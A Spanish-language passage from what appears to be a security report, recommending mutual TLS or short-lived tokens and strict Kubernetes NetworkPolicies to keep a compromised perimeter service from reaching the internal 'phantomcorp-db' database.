  No confiar en una petición por el simple hecho de provenir de una dirección IP de la red interna. La API de `phantomcorp-db` debe exigir **mTLS (Mutual TLS)** con certificados cliente emitidos para el servicio web, o tokens de autorización de corta duración (OAuth2/JWT). De este modo, aunque un atacante tome control de la máquina perimetral y ejecute `curl`, no podrá autenticarse ante la base de datos al no poseer el certificado criptográfico privado.
- **Políticas de red restrictivas en orquestadores (*NetworkPolicies*):**  
  En entornos de contenedores o Kubernetes, aplicar `NetworkPolicies` con aislamiento estricto que impidan que contenedores de la capa perimetral envíen paquetes hacia pods de bases de datos internas, salvo a través de puertos y servicios explícitamente declarados en la lista blanca de la arquitectura.
